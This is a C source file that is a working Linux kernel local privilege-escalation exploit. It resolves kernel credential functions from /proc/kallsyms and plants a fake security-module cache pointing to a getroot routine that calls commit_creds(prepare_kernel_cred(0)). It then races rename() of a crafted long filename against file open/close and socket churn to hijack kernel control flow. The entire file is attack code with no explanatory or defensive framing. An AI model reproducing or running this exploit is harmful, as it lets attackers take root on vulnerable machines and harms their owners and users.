#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>
#include <signal.h>
#include <sys/eventfd.h>
#define SOCKNUM 10
void *callrename( void *ptr );
void *openclose( void *ptr );
pthread_t thread1, thread2;
int lastfd;
char fake_lsm_cache[12];


typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;


int win=0;
unsigned long
get_symbol(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy;
	char sname[512];
	int ret = 0, oldstyle;

	f = fopen("/proc/kallsyms", "r");
	if (f == NULL) {
		f = fopen("/proc/ksyms", "r");
		if (f == NULL)
			return 0;
		oldstyle = 1;
	}

	while (ret != EOF) {
		if (!oldstyle) {
			ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sname);
		} else {
			ret = fscanf(f, "%p %s\n", (void **) &addr, sname);
			if (ret == 2) {
				char *p;
				if (strstr(sname, "_O/") || strstr(sname, "_S.")) {
					continue;
				}
				p = strrchr(sname, '_');
				if (p > ((char *) sname + 5) && !strncmp(p - 3, "smp", 3)) {
					p = p - 4;
					while (p > (char *)sname && *(p - 1) == '_') {
						p--;
					}
					*p = '\0';
				}
			}
		}
		if (ret == 0) {
			fscanf(f, "%s\n", sname);
			continue;
		}
		if (!strcmp(name, sname)) {
			printf("[+] resolved symbol %s to %p\n", name, (void *) addr);
			fclose(f);
			return addr;
		}
	}
	fclose(f);

	return 0;
}


int getroot(void) {
	win=1;
	commit_creds(prepare_kernel_cred(0));
	return 0;
}


void *evil_ptr;


main()
{ 
     int  iret1, iret2,i;
     printf("fake_lsm here: %p\n",fake_lsm_cache);
     setvbuf(stdout,0,2,0);
     for (i=0;i<60;i++)
     {
        int fd=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
     }

     
     commit_creds = (_commit_creds)get_symbol("commit_creds");
	 prepare_kernel_cred = (_prepare_kernel_cred)get_symbol("prepare_kernel_cred");

	 evil_ptr = &getroot;
     printf("evil_ptr here: %p\n",evil_ptr);
     getchar();

     iret1 = pthread_create( &thread1, NULL, callrename, NULL);
     if(iret1)
     {
         fprintf(stderr,"Error - pthread_create() return code: %d\n",iret1);
         exit(EXIT_FAILURE);
     }
     iret2 = pthread_create( &thread2, NULL, openclose, NULL);
     if(iret2)
     {
         fprintf(stderr,"Error - pthread_create() return code: %d\n",iret2);
         exit(EXIT_FAILURE);
     }
     pthread_join( thread1, NULL);
     pthread_join( thread2, NULL); 
     exit(EXIT_SUCCESS);
}

void *callrename( void *ptr )
{
    int i,m;
    char longname[30];
    
    
    strcpy(longname,"test_dir/aaaa");
    strcat(longname,"\x02\x01\x01\x02"); //flags
    strcat(longname,"\x01\x01\x01\x01"); //type
    strcat(longname,"\x01\x01\x01\x01"); //domain
    *(int*)(longname+25)=(int)fake_lsm_cache;
    *(int*)(fake_lsm_cache)=1;
    *(int*)(fake_lsm_cache+4)=(int)evil_ptr;
    for (i=0;i<2000;i++)
    {
     rename("test_dir/f",longname);
     rename(longname,"test_dir/f");
    }
    printf("out of 1st loop\n");
}
void *openclose( void *ptr )
{
    int j,fd,m,portno,sockfd[SOCKNUM];
    struct sockaddr_in serv_addr;
    for (j=0;j<2000;j++)
    {
    fd=open("test_dir/f",O_RDWR);
for (m=0;m<SOCKNUM;m++){
    if(sockfd[m]!=0)

    close(sockfd[m]);}
    if (fd!=-1)
    {
    	close(fd);
    	for (m=0;m<SOCKNUM;m++)
    	{
    	sockfd[m]=socket(AF_INET,SOCK_STREAM,0);
    	}
    	//sleep(0.1);
    	for (m=0;m<SOCKNUM;m++)
    	{
    	bzero((char *) &serv_addr, sizeof(serv_addr));
	   serv_addr.sin_family = AF_INET;
	   serv_addr.sin_addr.s_addr = INADDR_ANY;
	   serv_addr.sin_port = htons(5000+m);
	   bind(sockfd[m], (struct sockaddr *) &serv_addr, sizeof(serv_addr));
    	}
    }
    }
}
